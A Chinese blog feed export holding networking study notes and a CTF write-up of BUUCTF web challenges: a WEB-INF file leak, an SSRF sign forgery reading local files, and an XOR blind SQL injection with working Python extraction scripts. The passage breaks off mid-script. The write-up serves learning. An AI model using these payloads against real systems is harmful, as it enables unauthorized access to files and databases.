服务器被称为“匿名”(Anonymous)FTP服务器。这类服务器的目的是向公众提供文件拷贝服务，不要求用户事先在该服务器进行登记注册，也不用取得FTP服务器的授权。Anonymous(匿名文件传输)能够使用户与远程主机建立连接并以匿名身份从远程主机上拷贝文件，而不必是该远程主机的注册用户。用户使用特殊的用户名“anonymous”登陆FTP服务，就可访问远程主机上公开的文件。这样可以减少服务器的压力。</p></blockquote></li></ul><p>FTP使用TCP实现可靠传输</p><p>FTP的服务器进程分为两种：</p><ul><li>一个主进程：负责接收请求</li><li>n个从属进程：去处理用户请求</li></ul><p>这是ftp传输的过程及其使用的端口号：</p><p><img src="http://cdn.clown2024.cn/202407151536596.png" alt="image-20240305095147480"></p><p>ftp传输的文件有两种模式：</p><ul><li>文本模式：ASCII模式，以文本序列传输数据</li><li>二进制模式：Binary模式，以二进制序列传输数据</li></ul><h1><span id="电子邮件">电子邮件</span></h1><h2><span id="信息格式">信息格式</span></h2><ul><li><p>信封：例如<a href="mailto:&#x78;&#120;&#120;&#64;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;">&#x78;&#120;&#120;&#64;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;</a></p></li><li><p>内容</p><ul><li><p>首部</p><p><img src="http://cdn.clown2024.cn/202407151536597.png" alt="image-20240305124931354"></p></li><li><p>主体</p><p>就是邮件内容了。</p></li></ul></li></ul><h2><span id="组成结构">组成结构</span></h2><p>邮件发送采用C&#x2F;S模式，邮件服务器既可以做服务器也可以做发送方客户端，下面是一个示意图：</p><p><img src="http://cdn.clown2024.cn/202407151536598.png" alt="image-20240305130100685"></p><p>邮件是存放在邮件服务器的缓存当中</p><h2><span id="smtp协议">SMTP协议</span></h2><p>SMTP规定了14条命令(几个字母)和21种应信息(三位数字代码+简单文字说明)。</p><p>用于TCP连接的端口号一般是25端口</p><p><strong>SMTP通信的三个阶段</strong></p><p>连接建立&#x3D;》邮件传送&#x3D;》连接释放</p><p><img src="http://cdn.clown2024.cn/202407151536599.png" alt="image-20240305131325496"></p><p><strong>SMTP的缺点</strong></p><ol><li><p>SMTP不能传送可执行文件或者其他二进制对象。</p></li><li><p>SMTP仅限于传送7位ASCII码，不能传送其他非英语国家的文字。</p></li><li><p>SMTP服务器会拒绝超过一定长度的邮件。</p></li></ol><p><strong>MIME</strong></p><p>也叫通用因特网邮件扩充MIME，用来弥补SMTP协议的不足，MIME是电子邮件可以传输各种各样的数据</p><p><img src="http://cdn.clown2024.cn/202407151536600.png" alt="image-20240305131619206"></p><p>现在也不光为邮件服务使用，也已经为浏览器使用，传输数据的时候就会声明传输的数据是什么MIME类型，http的请求头会有一栏<strong>content-type</strong>就是标识数据的MIME类型</p><h2><span id="邮局协议pop3">邮局协议POP3</span></h2><p>该协议也采用TCP连接，端口号一般为110，也是C&#x2F;S模式，作用在最后用户读取邮件内容的时候</p><p><img src="http://cdn.clown2024.cn/202407151536601.png" alt="image-20240305132443641"></p><p>其工作方式有两种：</p><ul><li>下载并保留(在服务器)</li><li>下载并删除</li></ul><h2><span id="网际报文存取协议imap">网际报文存取协议IMAP</span></h2><p>IMAP协议比POP协议复杂。当用户Pc上的IMAP客户程序打开IMAP服务器的邮箱时，用户可以看到邮箱的首部，若用户需要打开某个邮件，该邮件才上传到用户的计算机上。</p><p>IMAP可以让用户在不同的地方使用不同的计算机随时上网阅读处理邮件，还允许只读取邮件中的某一个部分<br>(先看正文，有WiFi的时候再下载附件)。</p><p>该协议也是和POP3一样作用在最后一个环节</p><h2><span id="基于万维网的电子邮件">基于万维网的电子邮件</span></h2><p>现在很少专门去下载发送邮件的软件，我们直接在网上输入邮箱写上内容就可以发送邮件了，是基于http协议去连接别的厂商的邮件服务器，比如通过http协议用户代理连接到网易邮件服务器</p><p><img src="http://cdn.clown2024.cn/202407151536602.png" alt="image-20240305132800061"></p><h1><span id="万维网和http协议">万维网和HTTP协议</span></h1><h2><span id="url和uri">URL和URI</span></h2><p><strong>URI</strong>叫做统一资源标识符，<strong>URL</strong>（统一资源定位符）是其中的一种。</p><p>HTTP 请求的内容通称为”资源”。”资源“这一概念非常宽泛，它可以是一份文档，一张图片，或所有其他你能够想到的格式。每个资源都由一个 <strong>URI</strong> 来进行标识。</p><p>一般情况下，资源的名称和位置由同一个 URL（统一资源定位符，它是 URI 的一种）来标识。也有某些特殊情况，资源的名称和位置由不同的 URI 进行标识：例如，待请求的资源希望客户端从另外一个位置访问它。我们可以使用一个特定的首部字段，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Alt-Svc"><code>Alt-Svc</code></a>，来指示这种情况。</p><p><strong>URL</strong> 由多个必须或可选的组件构成。下面给出了一个复杂的 URL：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument<br></code></pre></td></tr></table></figure><p><strong>URL的结构如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">URI=scheme:[//authority]path[?query][#fragment]<br>authority组件又分为三部分：[userinfo@]host[:port]<br>该组件中，userinfo用的比较少，一般HTTP以匿名的方式获取数据，如果要进行身份验证，格式为 username:password ,以@结尾<br></code></pre></td></tr></table></figure><p><strong>URN</strong> 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">urn:isbn:9780141036144<br>urn:ietf:rfc:7230<br></code></pre></td></tr></table></figure><h2><span id="http请求过程">HTTP请求过程</span></h2><p>HTTP请求具体过程示例图：</p><p><img src="http://cdn.clown2024.cn/202407151536603.png" alt="image-20240305133740408"></p><h2><span id="http连接方式">HTTP连接方式</span></h2><p>http协议本身是一个无状态协议，如果需要识别用户的话可以利用Cookie</p><p>连接方式：</p><ul><li><p>持久连接(Keep-alive)</p><p>只需要进行一次TCP连接，后续再发送新数据不需要重新建立连接</p><ul><li><p>非流水线</p><p><img src="http://cdn.clown2024.cn/202407151536604.png" alt="image-20240305134328129"></p><p>这就是非流水线式的连接，要在收到响应后才能继续下一次请求</p></li><li><p>流水线</p><p>就是可以同时发送多个请求报文不需要逐次等待</p></li></ul></li><li><p>非持久连接(Close)</p><p><img src="http://cdn.clown2024.cn/202407151536605.png" alt="image-20240305134223174"></p><p>即每次发送一次新的数据都需要重新建立连接，比较耗时</p></li></ul><h2><span id="http请求报文结构">HTTP请求报文结构</span></h2><p>这里放一张图就行了，这是get请求的报文结构</p><p><img src="http://cdn.clown2024.cn/202407151536606.png" alt="image-20240305134824112"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习(1)</title>
      <link href="/2024/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2024/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p><strong>这里根据王道考研视频来学习，啃书太折磨了()</strong></p><h1><span id="性能指标">性能指标</span></h1><h2><span id="速率">速率</span></h2><p><img src="http://cdn.clown2024.cn/202407151536870.png" alt="image-20240305004320101"></p><h2><span id="带宽">带宽</span></h2><p>计算机网络中，带宽用来表示网络的通信线路传送数据的能力，通常是指单位时间内从网络中的某一点到另一点所能通过的“最高数据率”。单位是“比特每秒”，b&#x2F;s，kb&#x2F;s，Mb&#x2F;s，Gb&#x2F;s。网络设备所支持的最高速度。</p><p>也就是理论上的最高速率。</p><p>带宽增大也就是发送的速率变快了，并不影响传播的速率。</p><h2><span id="吞吐量">吞吐量</span></h2><p>表示在单位时间内通过某个网络(或信道、接口)的数据量。单位b&#x2F;s，kb&#x2F;s，Mb&#x2F;s等。</p><p>吞吐量受网络的带宽或网络的额定速率的限制。</p><h2><span id="时延">时延</span></h2><p>指数据(报文&#x2F;分组&#x2F;比特流)从网络(或链路)的一端传送到另一端所需的时间。也叫延迟或迟延。单位是s。</p><p>时延又分为4种：</p><ul><li>发送时延(传输时延)：发送时延&#x3D;数据长度&#x2F;信道带宽(发送速率)</li><li>传播时延：取决于电磁波传播速度和链路长度，传播时延&#x3D;信道长度&#x2F;电磁波在信道上的传播速率</li><li>排队时延：等待输出、输入链路可用(例如排队等安检)</li><li>处理时延：检错找出口(例如安检时的过程要的时间)</li></ul><h2><span id="时延带宽积">时延带宽积</span></h2><p>时延带宽积(bit)&#x3D;传播时延(s) X 带宽(b&#x2F;s)</p><p>时延带宽积又称为以比特为单位的链路长度</p><p>就是链路上的容量</p><h2><span id="往返时延rtt">往返时延RTT</span></h2><p>从发送方发送数据开始，到发送方收到接收方的确认(接收方收到数据后立即发送确认)，总共经历的时延。</p><p>这里可以用ping来看到往返时延</p><p><img src="http://cdn.clown2024.cn/202407151536871.png" alt="image-20240305084247521"></p><p>上面的时间就是往返时延</p><p>RTT越大，在收到确认之前，可以发送的数据越多，因为收到确认前的时间越长</p><p>RTT包括以下两部分：</p><ul><li>往返传播时延&#x3D;传播时延*2（主要就是这个）</li><li>末端处理时间</li></ul><h2><span id="利用率">利用率</span></h2><ul><li>信道利用率：信道利用率&#x3D;有数据通过时间&#x2F;(有+无)数据通过时间</li><li>网络利用率：信道利用率的加权平均值</li></ul><p><strong>时延和利用率的关系图</strong></p><p><img src="http://cdn.clown2024.cn/202407151536872.png" alt="image-20240305084703782"></p><p>这就相当于高速车辆越多行驶越缓慢</p><h1><span id="osi七层模型">OSI七层模型</span></h1><p>OSI七层模型偏理论，并不在实际中运用，因为该模型十分理想，且效率低但对我们了解网络模型有帮助</p><p><img src="http://cdn.clown2024.cn/202407151536873.png" alt="image-20240304110839603"></p><p>下面是一个利用OSI七层模型通过中间系统进行信息传输的示例图</p><p><img src="http://cdn.clown2024.cn/202407151536874.png" alt="image-20240304111508504"></p><p>除了物理层，每一层都会对数据进行封装再往下一层传输，信息处理的过程示例图如下，也就是打包和拆包的过程</p><p><img src="http://cdn.clown2024.cn/202407151536875.png" alt="image-20240304111743194"></p><h2><span id="应用层">应用层</span></h2><p>能和用户交互产生网路流量的程序</p><p>典型应用层服务：</p><p>文件传输(FTP)</p><p>电子邮件(SMTP)</p><p>万维网(HTTP)</p><p>……</p><h2><span id="表示层">表示层</span></h2><p>用户处理两个通信系统中交换信息的表示方式</p><p>功能一：数据格式变换</p><p>功能二：数据加密解密</p><p>功能三：数据压缩和恢复</p><h2><span id="会话层">会话层</span></h2><p>向表示层实体&#x2F;用户进程提供建立连接并在连接上有序地传输数据。</p><p>这是会话也是建立同步</p><p>功能一：建立、管理、终止会话</p><p>功能二：使用校验点可使会话在通信失效时从校验点&#x2F;同步点继续恢复通信，实现数据同步。适用于传输大文件</p><h2><span id="传输层">传输层</span></h2><p>负责主机中两个进程的通信，即&#x3D;&#x3D;端到端&#x3D;&#x3D;的通信(也就是端口号那种)。传输单位是报文段或用户数据报。</p><p>功能一:可靠传输、不可靠传输</p><p>功能二:差错控制</p><p>功能三:流量控制</p><p>功能四:复用分用</p><blockquote><p>复用:多个应用层进程可同时使用下面传输层的服务。</p><p>分用:传输层把收到的信息分别交付给上面应用层中相应的进程，</p></blockquote><h2><span id="网络层">网络层</span></h2><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务，网络层传输单位是数据报。</p><p>功能一:路由选择(最佳路径)</p><p>功能二:流量控制</p><p>功能三:差错控制</p><p>功能四:拥塞控制</p><blockquote><p>若所有结点都来不及接受分组，而要丢弃大量分组的话，网络就处于拥塞状态。因此要采取一定措施，缓解这种拥塞，也就是拥塞控制。</p></blockquote><p>该层主要协议：</p><p>IP、IPX、ICMP、IGMP、ARP、RARP、OSPF</p><h2><span id="数据链路层">数据链路层</span></h2><p>主要任务是把网络层传下来的数据报组装成帧，数据链路层&#x2F;链路层的传输单位是帧。</p><p><img src="http://cdn.clown2024.cn/202407151536876.png" alt="image-20240305002727144"></p><h2><span id="物理层">物理层</span></h2><p>主要任务是在物理媒体上实现比特流的透明传输，物理层传输单位是比特，</p><p><img src="http://cdn.clown2024.cn/202407151536877.png" alt="image-20240305002907189"></p><h1><span id="tcpx2fip参考模型">TCP&#x2F;IP参考模型</span></h1><p>下面是一个TCP&#x2F;IP模型和起协议栈的对应图：<br><img src="http://cdn.clown2024.cn/202407151536878.png" alt="image-20240305003141069"></p><p><strong>TCP&#x2F;IP和OSI的不同之处：</strong></p><p><img src="http://cdn.clown2024.cn/202407151536879.png" alt="image-20240305003538566"></p><blockquote><p>面向连接：分为三个阶段，第一阶段建立连接，第二阶段进行数据传输，第三阶段释放连接</p><p>无连接：直接进行数据传输</p></blockquote><h1><span id="5层参考模型">5层参考模型</span></h1><p>综合了OSI和TCP&#x2F;IP的优点</p><p><img src="http://cdn.clown2024.cn/202407151536880.png" alt="image-20240305003806547"></p><p>5层模型的封装和解封装过程如下：</p><p><img src="http://cdn.clown2024.cn/202407151536881.png" alt="image-20240305003949042"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu做题记录1</title>
      <link href="/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<h1><span id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java</span></h1><p>题目是一个登陆界面，试了一下admin&#x2F;admin没反应</p><p><img src="http://cdn.clown2024.cn/202407151439442.png" alt="image-20240302113439732"></p><p>点击帮助文档出现一个java语句<strong>java.io.FileNotFoundException:{help.docx}</strong></p><p><img src="http://cdn.clown2024.cn/202407151439443.png" alt="image-20240302113616226"></p><p>应该就是啥都没有，查看源码他的链接是这样的</p><p><img src="http://cdn.clown2024.cn/202407151439444.png" alt="image-20240302113731820"></p><p>没啥思路去看别的师傅的wp，这里涉及到一个WEB-INF&#x2F;xml的文件泄露，因为这题的环境是java的web应用</p><p>参考文章：<a href="https://www.cnblogs.com/darkcyan/p/17668377.html">https://www.cnblogs.com/darkcyan/p/17668377.html</a></p><p><strong>WEB-INF知识</strong></p><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>这是一些主要敏感目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件<br>/WEB-INF/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure><p>然后就去下载页面去看这些敏感目录的内容，先去看WEB-INF&#x2F;web.xml</p><p>不过这里的下载页面很奇怪，get请求的时候是下载不了的，改成post就可以了，上面的help文档也是</p><p><img src="http://cdn.clown2024.cn/202407151439445.png" alt="image-20240302115936170"></p><p>改成post去看一下文件内容</p><p><img src="http://cdn.clown2024.cn/202407151439446.png" alt="image-20240302120029103"></p><p>这是从别的师傅那找来的相关标签的用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径<br><br>&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点<br>一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致<br>另一个是&lt;url-pattern&gt;，配置这个组件的访问路径<br><br>&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关<br><br>举个例子<br>&lt;servlet&gt;<br>    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br></code></pre></td></tr></table></figure><p>然后上面的web.xml文件我们看到了flag相关的类，然后有个路径我试着去访问了一下返回500状态码，那就要去找FlagController.class文件了</p><p>因为WEB-INF&#x2F;classes里面包含了所有class文件，所以我们从该目录开始然后通过包名去写路径即可拿到想要的class文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/Download<br><br>POST:<br>filename=WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439447.png" alt="image-20240302121422866"></p><p>然后将其中的base64字符串拿去解码即可获得flag</p><h1><span id="de1ctf-2019ssrf-me">[De1CTF 2019]SSRF Me</span></h1><p>题目进去就看到一段很丑陋的源代码，看源码也没有格式化好</p><p><img src="http://cdn.clown2024.cn/202407151439448.png" alt="image-20240303014938284"></p><p>直接去让gpt给我美化了一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>根据题目的提示flag在.&#x2F;flag.txt里面</p><p>审计源码发现param和action是我们可控的参数，在Exec函数里，在通过checkSign()的校验之后，如果cookie中的aciton包含scan就写入文件，如果包含read就读取文件</p><p>这里由于waf过滤了gopher和file，就不能通过param直接传参读文件，不过urllib.urlopen()这个方法有两种方法读取本地文件</p><ul><li>直接写文件名</li><li>利用local_file协议：该协议和file的用法一样，local_file&#x2F;&#x2F;&#x2F;etc&#x2F;passwd，但是也被过滤了</li></ul><p>所以这里在param填文件名写入文件</p><p><img src="http://cdn.clown2024.cn/202407151439449.png" alt="image-20240303155134761"></p><p>然后我们就要再去将action换成read去读取，不过这里生成的sign就需要自己去构造了，因为&#x2F;geneSign路由默认的action是scan，我们去看一下getSign()函数</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>这里我们不知道secret_key，但是&#x2F;geneSign默认action为scan，想查看文件又一定要read，所以直接后面加个read生成sign即可</p><p><img src="http://cdn.clown2024.cn/202407151439450.png" alt="image-20240303160239016"></p><p>然后我们给param传一个readsign即可，因为知识检测是否有该关键字</p><p><img src="http://cdn.clown2024.cn/202407151439451.png" alt="image-20240303161016765"></p><h1><span id="极客大挑战-2019finalsql">[极客大挑战 2019]FinalSQL</span></h1><p>这题进去有个登陆页面</p><p><img src="http://cdn.clown2024.cn/202407151439452.png" alt="image-20240303201649603"></p><p>一开始以为注入点在登陆的地方，因为直接get请求发送用户名和密码，试了一下发现没有，后才发现上面的12345会给url传递id参数</p><p><img src="http://cdn.clown2024.cn/202407151439453.png" alt="image-20240303201828243"></p><p>id传6之后的数字会发生变化，传递数字和字符串时返回的页面不一样</p><p><img src="http://cdn.clown2024.cn/202407151439454.png" alt="image-20240303201948963"></p><p><img src="http://cdn.clown2024.cn/202407151439455.png" alt="image-20240303202000621"></p><p>去尝试了一些字符发现被过滤了不想fuzz，去看wp说是^没被过滤，可以用异或来进行盲注，因为题目也有提示说盲注,参考文章：<a href="https://www.shawroot.cc/1158.html">https://www.shawroot.cc/1158.html</a></p><p>payload的大概思路就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1^(sql语句)<br>//比如爆库的话可以用改语句ord(substr(database(),1,1)&gt;10),这就是判断数据库第一位的ascii码值是否大于10，ord()函数也可以用ascii()函数代替<br>//如果页面回显为ERROR!!!，表示正确，因为1^1=0<br>//如果页面回显为NO! Not this! Click others~~~即id=1时的页面，则错误，因为1^0=1<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439456.png" alt="image-20240303214756062"></p><p>payload如下：</p><p>爆出库名脚本，这里直接按顺序爆下去不写二分法了</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr(database(),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439457.png" alt="image-20240303222137783"></p><p>然后得出数据库名为geek，这里延时了一点点，因为不知为什么会有几次漏了一些字符没有</p><p>然后改一改代码继续爆表名，参考上面文章可以用该语句先去测试一下表名长度，得出长度为16</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1^((select(length(group_concat(TABLE_NAME)))from(information_schema.tables)where(table_schema=&quot;geek&quot;))=16)<br></code></pre></td></tr></table></figure><p>emmm后来发现不止两个表，我就直接写50个字符来爆了</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span 